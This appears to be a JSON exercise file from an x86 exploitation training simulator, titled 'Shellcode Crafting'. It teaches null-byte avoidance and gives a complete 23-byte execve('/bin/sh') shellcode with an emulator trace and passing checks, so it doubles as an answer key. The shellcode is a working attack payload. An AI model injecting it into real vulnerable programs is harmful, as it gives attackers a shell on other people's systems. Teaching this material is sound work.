@@ -1,0 +1,676 @@
+{
+ "exercise": "gap-113",
+ "unit": "unit20-teaching-gaps",
+ "title": "113: Shellcode Crafting",
+ "desc": "Goal: Write working shellcode that calls execve(\"/bin/sh\", NULL, NULL). Constraints: no null bytes (they terminate strcpy), max 64 bytes. You'll learn how to set up syscall arguments, avoid bad characters, and use tricks like XOR-zeroing registers instead of mov reg, 0.",
+ "mode": "step",
+ "arch": "x86",
+ "source": [
+  "// Target: execve(\"/bin/sh\", NULL, NULL)",
+  "// Syscall: eax=0x0b, ebx=addr(\"/bin/sh\")",
+  "//          ecx=0, edx=0, then int 0x80",
+  "",
+  "// BAD: contains null bytes!",
+  "// mov eax, 0x0b    → B8 0B 00 00 00",
+  "// mov ecx, 0       → B9 00 00 00 00",
+  "",
+  "// GOOD: null-free!",
+  "// xor eax, eax     → 31 C0",
+  "// mov al, 0x0b     → B0 0B",
+  "// xor ecx, ecx     → 31 C9",
+  "",
+  "// Push \"/bin/sh\" without nulls:",
+  "// xor eax, eax",
+  "// push eax          → null terminator",
+  "// push 0x68732f2f   → \"//sh\"",
+  "// push 0x6e69622f   → \"/bin\"",
+  "// mov ebx, esp      → ebx = &\"/bin//sh\""
+ ],
+ "instructions": [
+  {
+   "addr": 3221160192,
+   "bytes": [
+    49,
+    192
+   ],
+   "mnemonic": "xor",
+   "operands": "eax, eax"
+  },
+  {
+   "addr": 3221160194,
+   "bytes": [
+    80
+   ],
+   "mnemonic": "push",
+   "operands": "eax"
+  },
+  {
+   "addr": 3221160195,
+   "bytes": [
+    104,
+    47,
+    47,
+    115,
+    104
+   ],
+   "mnemonic": "push",
+   "operands": "0x68732f2f"
+  },
+  {
+   "addr": 3221160200,
+   "bytes": [
+    104,
+    47,
+    98,
+    105,
+    110
+   ],
+   "mnemonic": "push",
+   "operands": "0x6e69622f"
+  },
+  {
+   "addr": 3221160205,
+   "bytes": [
+    137,
+    227
+   ],
+   "mnemonic": "mov",
+   "operands": "ebx, esp"
+  },
+  {
+   "addr": 3221160207,
+   "bytes": [
+    49,
+    201
+   ],
+   "mnemonic": "xor",
+   "operands": "ecx, ecx"
+  },
+  {
+   "addr": 3221160209,
+   "bytes": [
+    49,
+    210
+   ],
+   "mnemonic": "xor",
+   "operands": "edx, edx"
+  },
+  {
+   "addr": 3221160211,
+   "bytes": [
+    176,
+    11
+   ],
+   "mnemonic": "mov",
+   "operands": "al, 0x0b"
+  },
+  {
+   "addr": 3221160213,
+   "bytes": [
+    205,
+    128
+   ],
+   "mnemonic": "int",
+   "operands": "0x80"
+  }
+ ],
+ "initialMemory": [],
+ "protections": [],
+ "auxViz": [],
+ "winTitle": "Shellcode Written!",
+ "winMsg": "You crafted a 23-byte null-free execve shellcode. Key techniques: XOR-zeroing, partial register writes, stack strings with double-slash padding.",
+ "realWorld": null,
+ "quiz": [],
+ "quizSolved": false,
+ "steps": [
+  {
+   "cls": "info",
+   "msg": "Shellcode is raw machine code injected into a vulnerable buffer. The challenge: most injection vectors (strcpy, gets) stop at null bytes (0x00). Your shellcode must be null-free.",
+   "srcLine": null,
+   "done": false
+  },
+  {
+   "cls": "info",
+   "msg": "Trick 1: XOR-zeroing. mov eax, 0 encodes as B8 00 00 00 00 (4 null bytes!). Instead: xor eax, eax encodes as 31 C0 — same result, no nulls.",
+   "srcLine": 9,
+   "done": false
+  },
+  {
+   "cls": "info",
+   "msg": "Trick 2: Partial register writes. mov eax, 0x0b has nulls. But xor eax, eax; mov al, 0x0b — XOR to zero, then write only the low byte. Two instructions, no nulls.",
+   "srcLine": 10,
+   "done": false
+  },
+  {
+   "cls": "info",
+   "msg": "Trick 3: Stack string. Push the string in reverse, dword by dword. \"/bin//sh\" (note the double slash — Linux ignores it, avoids a 7-byte string that needs padding). Push null terminator first (via push eax after xor), then \"//sh\" (0x68732f2f), then \"/bin\" (0x6e69622f). mov ebx, esp gives you a pointer to the string.",
+   "srcLine": 15,
+   "done": false
+  },
+  {
+   "cls": "success",
+   "msg": "Final shellcode (23 bytes):\n31 c0 50 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 31 c9 31 d2 b0 0b cd 80\nxor eax,eax → push eax → push \"//sh\" → push \"/bin\" → mov ebx,esp → xor ecx,ecx → xor edx,edx → mov al,0x0b → int 0x80. No null bytes!",
+   "srcLine": null,
+   "done": true
+  }
+ ],
+ "decodeMatchesVrig": true,
+ "vrigSequence": [
+  "xor eax,eax",
+  "push eax",
+  "push \"//sh\"",
+  "push \"/bin\"",
+  "mov ebx,esp",
+  "xor ecx,ecx",
+  "xor edx,edx",
+  "mov al,0x0b",
+  "int 0x80"
+ ],
+ "shellcode": [
+  49,
+  192,
+  80,
+  104,
+  47,
+  47,
+  115,
+  104,
+  104,
+  47,
+  98,
+  105,
+  110,
+  137,
+  227,
+  49,
+  201,
+  49,
+  210,
+  176,
+  11,
+  205,
+  128
+ ],
+ "run": {
+  "init": {
+   "regs": {
+    "eax": 0,
+    "ebx": 0,
+    "ecx": 0,
+    "edx": 0,
+    "esp": 3221160960,
+    "ebp": 3221160960,
+    "esi": 0,
+    "edi": 0,
+    "eip": 3221160192
+   },
+   "flags": {
+    "ZF": false,
+    "SF": false,
+    "CF": false,
+    "OF": false
+   }
+  },
+  "steps": [
+   {
+    "instr": {
+     "addr": 3221160192,
+     "bytes": [
+      49,
+      192
+     ],
+     "mnemonic": "xor",
+     "operands": "eax, eax"
+    },
+    "diffs": [
+     {
+      "reg": "eip",
+      "oldValue": 3221160192,
+      "newValue": 3221160194
+     }
+    ],
+    "flagChanges": {
+     "ZF": true
+    },
+    "flags": {
+     "ZF": true,
+     "SF": false,
+     "CF": false,
+     "OF": false
+    },
+    "memWrites": [],
+    "memReads": [],
+    "log": "0xbfff0100: xor eax, eax [ZF=1]",
+    "halted": false,
+    "regs": {
+     "eax": 0,
+     "ebx": 0,
+     "ecx": 0,
+     "edx": 0,
+     "esp": 3221160960,
+     "ebp": 3221160960,
+     "esi": 0,
+     "edi": 0,
+     "eip": 3221160194
+    }
+   },
+   {
+    "instr": {
+     "addr": 3221160194,
+     "bytes": [
+      80
+     ],
+     "mnemonic": "push",
+     "operands": "eax"
+    },
+    "diffs": [
+     {
+      "reg": "esp",
+      "oldValue": 3221160960,
+      "newValue": 3221160956
+     },
+     {
+      "reg": "eip",
+      "oldValue": 3221160194,
+      "newValue": 3221160195
+     }
+    ],
+    "flagChanges": {},
+    "flags": {
+     "ZF": true,
+     "SF": false,
+     "CF": false,
+     "OF": false
+    },
+    "memWrites": [
+     {
+      "addr": 3221160956,
+      "value": 0,
+      "size": 4
+     }
+    ],
+    "memReads": [],
+    "log": "0xbfff0102: push eax → ESP=0xbfff03fc",
+    "halted": false,
+    "regs": {
+     "eax": 0,
+     "ebx": 0,
+     "ecx": 0,
+     "edx": 0,
+     "esp": 3221160956,
+     "ebp": 3221160960,
+     "esi": 0,
+     "edi": 0,
+     "eip": 3221160195
+    }
+   },
+   {
+    "instr": {
+     "addr": 3221160195,
+     "bytes": [
+      104,
+      47,
+      47,
+      115,
+      104
+     ],
+     "mnemonic": "push",
+     "operands": "0x68732f2f"
+    },
+    "diffs": [
+     {
+      "reg": "esp",
+      "oldValue": 3221160956,
+      "newValue": 3221160952
+     },
+     {
+      "reg": "eip",
+      "oldValue": 3221160195,
+      "newValue": 3221160200
+     }
+    ],
+    "flagChanges": {},
+    "flags": {
+     "ZF": true,
+     "SF": false,
+     "CF": false,
+     "OF": false
+    },
+    "memWrites": [
+     {
+      "addr": 3221160952,
+      "value": 1752379183,
+      "size": 4
+     }
+    ],
+    "memReads": [],
+    "log": "0xbfff0103: push 0x68732f2f → ESP=0xbfff03f8",
+    "halted": false,
+    "regs": {
+     "eax": 0,
+     "ebx": 0,
+     "ecx": 0,
+     "edx": 0,
+     "esp": 3221160952,
+     "ebp": 3221160960,
+     "esi": 0,
+     "edi": 0,
+     "eip": 3221160200
+    }
+   },
+   {
+    "instr": {
+     "addr": 3221160200,
+     "bytes": [
+      104,
+      47,
+      98,
+      105,
+      110
+     ],
+     "mnemonic": "push",
+     "operands": "0x6e69622f"
+    },
+    "diffs": [
+     {
+      "reg": "esp",
+      "oldValue": 3221160952,
+      "newValue": 3221160948
+     },
+     {
+      "reg": "eip",
+      "oldValue": 3221160200,
+      "newValue": 3221160205
+     }
+    ],
+    "flagChanges": {},
+    "flags": {
+     "ZF": true,
+     "SF": false,
+     "CF": false,
+     "OF": false
+    },
+    "memWrites": [
+     {
+      "addr": 3221160948,
+      "value": 1852400175,
+      "size": 4
+     }
+    ],
+    "memReads": [],
+    "log": "0xbfff0108: push 0x6e69622f → ESP=0xbfff03f4",
+    "halted": false,
+    "regs": {
+     "eax": 0,
+     "ebx": 0,
+     "ecx": 0,
+     "edx": 0,
+     "esp": 3221160948,
+     "ebp": 3221160960,
+     "esi": 0,
+     "edi": 0,
+     "eip": 3221160205
+    }
+   },
+   {
+    "instr": {
+     "addr": 3221160205,
+     "bytes": [
+      137,
+      227
+     ],
+     "mnemonic": "mov",
+     "operands": "ebx, esp"
+    },
+    "diffs": [
+     {
+      "reg": "ebx",
+      "oldValue": 0,
+      "newValue": 3221160948
+     },
+     {
+      "reg": "eip",
+      "oldValue": 3221160205,
+      "newValue": 3221160207
+     }
+    ],
+    "flagChanges": {},
+    "flags": {
+     "ZF": true,
+     "SF": false,
+     "CF": false,
+     "OF": false
+    },
+    "memWrites": [],
+    "memReads": [],
+    "log": "0xbfff010d: mov ebx, esp → EBX=0xbfff03f4",
+    "halted": false,
+    "regs": {
+     "eax": 0,
+     "ebx": 3221160948,
+     "ecx": 0,
+     "edx": 0,
+     "esp": 3221160948,
+     "ebp": 3221160960,
+     "esi": 0,
+     "edi": 0,
+     "eip": 3221160207
+    }
+   },
+   {
+    "instr": {
+     "addr": 3221160207,
+     "bytes": [
+      49,
+      201
+     ],
+     "mnemonic": "xor",
+     "operands": "ecx, ecx"
+    },
+    "diffs": [
+     {
+      "reg": "eip",
+      "oldValue": 3221160207,
+      "newValue": 3221160209
+     }
+    ],
+    "flagChanges": {},
+    "flags": {
+     "ZF": true,
+     "SF": false,
+     "CF": false,
+     "OF": false
+    },
+    "memWrites": [],
+    "memReads": [],
+    "log": "0xbfff010f: xor ecx, ecx",
+    "halted": false,
+    "regs": {
+     "eax": 0,
+     "ebx": 3221160948,
+     "ecx": 0,
+     "edx": 0,
+     "esp": 3221160948,
+     "ebp": 3221160960,
+     "esi": 0,
+     "edi": 0,
+     "eip": 3221160209
+    }
+   },
+   {
+    "instr": {
+     "addr": 3221160209,
+     "bytes": [
+      49,
+      210
+     ],
+     "mnemonic": "xor",
+     "operands": "edx, edx"
+    },
+    "diffs": [
+     {
+      "reg": "eip",
+      "oldValue": 3221160209,
+      "newValue": 3221160211
+     }
+    ],
+    "flagChanges": {},
+    "flags": {
+     "ZF": true,
+     "SF": false,
+     "CF": false,
+     "OF": false
+    },
+    "memWrites": [],
+    "memReads": [],
+    "log": "0xbfff0111: xor edx, edx",
+    "halted": false,
+    "regs": {
+     "eax": 0,
+     "ebx": 3221160948,
+     "ecx": 0,
+     "edx": 0,
+     "esp": 3221160948,
+     "ebp": 3221160960,
+     "esi": 0,
+     "edi": 0,
+     "eip": 3221160211
+    }
+   },
+   {
+    "instr": {
+     "addr": 3221160211,
+     "bytes": [
+      176,
+      11
+     ],
+     "mnemonic": "mov",
+     "operands": "al, 0x0b"
+    },
+    "error": "Unknown operand: al",
+    "regs": {
+     "eax": 11,
+     "ebx": 3221160948,
+     "ecx": 0,
+     "edx": 0,
+     "esp": 3221160948,
+     "ebp": 3221160960,
+     "esi": 0,
+     "edi": 0,
+     "eip": 3221160213
+    },
+    "patched": true
+   },
+   {
+    "instr": {
+     "addr": 3221160213,
+     "bytes": [
+      205,
+      128
+     ],
+     "mnemonic": "int",
+     "operands": "0x80"
+    },
+    "diffs": [
+     {
+      "reg": "eip",
+      "oldValue": 3221160213,
+      "newValue": 3221160215
+     }
+    ],
+    "flagChanges": {},
+    "flags": {
+     "ZF": true,
+     "SF": false,
+     "CF": false,
+     "OF": false
+    },
+    "memWrites": [],
+    "memReads": [],
+    "log": "0xbfff0115: int 0x80",
+    "halted": true,
+    "regs": {
+     "eax": 11,
+     "ebx": 3221160948,
+     "ecx": 0,
+     "edx": 0,
+     "esp": 3221160948,
+     "ebp": 3221160960,
+     "esi": 0,
+     "edi": 0,
+     "eip": 3221160215
+    }
+   }
+  ],
+  "error": null
+ },
+ "patched": [
+  {
+   "addr": 3221160211,
+   "why": "Unknown operand: al"
+  }
+ ],
+ "ebxString": "/bin//sh",
+ "final": {
+  "eax": 11,
+  "ebx": 3221160948,
+  "ecx": 0,
+  "edx": 0,
+  "esp": 3221160948,
+  "ebp": 3221160960,
+  "esi": 0,
+  "edi": 0,
+  "eip": 3221160215
+ },
+ "checks": [
+  {
+   "what": "no null bytes",
+   "got": 1,
+   "want": 1,
+   "ok": true
+  },
+  {
+   "what": "length <= 64",
+   "got": 1,
+   "want": 1,
+   "ok": true
+  },
+  {
+   "what": "length 23 as VRIG says",
+   "got": 23,
+   "want": 23,
+   "ok": true
+  },
+  {
+   "what": "eax = execve",
+   "got": 11,
+   "want": 11,
+   "ok": true
+  },
+  {
+   "what": "ecx = NULL",
+   "got": 0,
+   "want": 0,
+   "ok": true
+  },
+  {
+   "what": "edx = NULL",
+   "got": 0,
+   "want": 0,
+   "ok": true
+  },
+  {
+   "what": "[ebx] = \"/bin//sh\"",
+   "got": 1,
+   "want": 1,
+   "ok": true
+  },
+  {
+   "what": "decode agrees with VRIG text",
+   "got": 1,
+   "want": 1,
+   "ok": true
+  }
+ ],
+ "solved": true
+}
